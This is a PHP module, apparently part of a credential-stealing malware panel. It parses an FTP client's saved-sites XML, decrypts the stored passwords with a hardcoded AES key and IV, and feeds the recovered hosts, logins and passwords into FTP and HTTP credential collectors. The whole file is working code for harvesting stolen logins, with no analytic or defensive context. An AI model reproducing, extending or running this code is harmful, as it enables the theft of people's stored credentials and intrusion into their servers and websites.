<?php

	class Module_steed extends Module_
	{
		function Decrypt($Source)
		{
			$KEY_ = hex2bin("aa7f0216696fbe5969ad034a293be311001f3ca1be92a8f2d83ed10d080bf8b6");
			$IV_  = "2BB#3d67@+66s7H8";
		
			$Source = base64_decode($Source);
			if(!$Source)
			{
				return '';
			}
			
			return mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $KEY_, $Source, MCRYPT_MODE_CBC, $IV_);
		}
		
		function ProcessSteed($Source)
		{
			$XML_ = simplexml_load_string($Source);
			if(!$XML_)
			{
				return FALSE;
			}
			$Sites = $XML_->Groups->Group->Sites;
			
		    foreach($Sites->children() as $Element)
			{
				if(isset($Element->Url))
				{
					$Host = Assign_($Element->Url);
					$Port = Assign_($Element->Port);
					$User = Assign_($Element->Login);
					$Pass = $this->Decrypt($Element->Password);
					$Prot = Assign_($Element->Protocol);
					
					if ($Prot == 'ftp' || $Prot == 'sftp' || $Prot == 'ftps' )
						$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == "sftp") , $Port), $User, $Pass);
					else
						$this->add_http($this->append_port($Host, $Port), $User, $Pass);
				}
			}
					
			$XML_ = NULL;
		}
			
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
					$this->ProcessSteed($Data);
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}